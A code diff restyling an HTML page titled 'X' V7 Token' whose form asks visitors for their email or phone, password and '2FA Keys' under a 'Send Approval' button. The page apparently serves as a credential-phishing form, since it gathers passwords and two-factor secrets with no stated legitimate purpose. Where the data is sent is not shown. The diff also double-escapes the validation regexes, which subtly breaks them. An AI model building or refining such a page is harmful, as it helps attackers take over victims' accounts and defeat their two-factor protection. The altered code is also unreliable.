@@ -5,48 +5,61 @@
   <title>X' V7 Token</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      padding: 20px;
-    }
-    header, footer {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #8b0000, #4b0082); /* reddish purple gradient */
+      color: #fff;
       text-align: center;
-      font-weight: bold;
-      margin-bottom: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
     }
-    form {
-      max-width: 400px;
-      margin: auto;
-      background: #fff;
+    header {
       padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      font-size: 2em;
+      font-weight: bold;
+      color: #fff;
+      text-shadow: 2px 2px 6px rgba(0,0,0,0.6);
     }
-    label {
+    .form-container {
+      background: rgba(0,0,0,0.4);
+      padding: 20px;
+      border-radius: 12px;
+      margin: 20px;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+    }
+    .form-container label {
       display: block;
-      margin-top: 10px;
+      margin: 12px 0 6px;
       font-weight: bold;
+      text-align: left;
     }
-    input {
-      width: 100%;
-      padding: 8px;
-      margin-top: 5px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-    }
-    button {
-      margin-top: 15px;
+    .form-container input[type="text"] {
+      width: 92%;
       padding: 10px;
-      width: 100%;
-      background: #007bff;
-      color: white;
+      border-radius: 6px;
       border: none;
-      border-radius: 4px;
-      font-weight: bold;
-      cursor: pointer;
+      margin-bottom: 12px;
+      font-size: 1em;
     }
-    button:hover {
-      background: #0056b3;
+    .form-container button {
+      width: 100%;
+      padding: 14px;
+      background: #ff4444;
+      color: #fff;
+      font-size: 1.2em;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .form-container button:hover {
+      background: #cc0000;
     }
     .message {
       margin-top: 20px;
@@ -54,30 +67,37 @@
       text-align: center;
     }
     .error {
-      color: red;
+      color: #ffdddd;
     }
     .success {
-      color: green;
+      color: #90ee90;
+    }
+    footer {
+      margin: 20px;
+      font-size: 0.9em;
+      color: #ddd;
     }
   </style>
 </head>
 <body>
   <header>X' V7 Token</header>
 
-  <form id="approvalForm">
-    <label for="email">Email / Phone:</label>
-    <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
+  <div class="form-container">
+    <form id="approvalForm">
+      <label for="email">Email / Phone:</label>
+      <input type="text" id="email" name="email" placeholder="Enter your email or phone" required>
 
-    <label for="password">Password:</label>
-    <input type="text" id="password" name="password" placeholder="Enter your password" required>
+      <label for="password">Password:</label>
+      <input type="text" id="password" name="password" placeholder="Enter your password" required>
 
-    <label for="twofa">2FA Keys:</label>
-    <input type="text" id="twofa" name="twofa" placeholder="Enter your 2FA key" required>
+      <label for="twofa">2FA Keys:</label>
+      <input type="text" id="twofa" name="twofa" placeholder="Enter your 2FA key" required>
 
-    <button type="submit">Send Approval</button>
-  </form>
+      <button type="submit">Send Approval</button>
+    </form>
 
-  <div id="response" class="message"></div>
+    <div id="response" class="message"></div>
+  </div>
 
   <footer>Made by Ahmer Awan</footer>
 
@@ -97,8 +117,8 @@
       const twofaValue = twofaField.value.trim();
 
       // ✅ Validation: email OR 11-digit phone number
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      const phoneRegex = /^\d{11}$/;
+      const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
+      const phoneRegex = /^\\d{11}$/;
 
       if (!emailRegex.test(typedValue) && !phoneRegex.test(typedValue)) {
         responseDiv.textContent = "Invalid input: please enter a valid email or 11-digit phone number.";
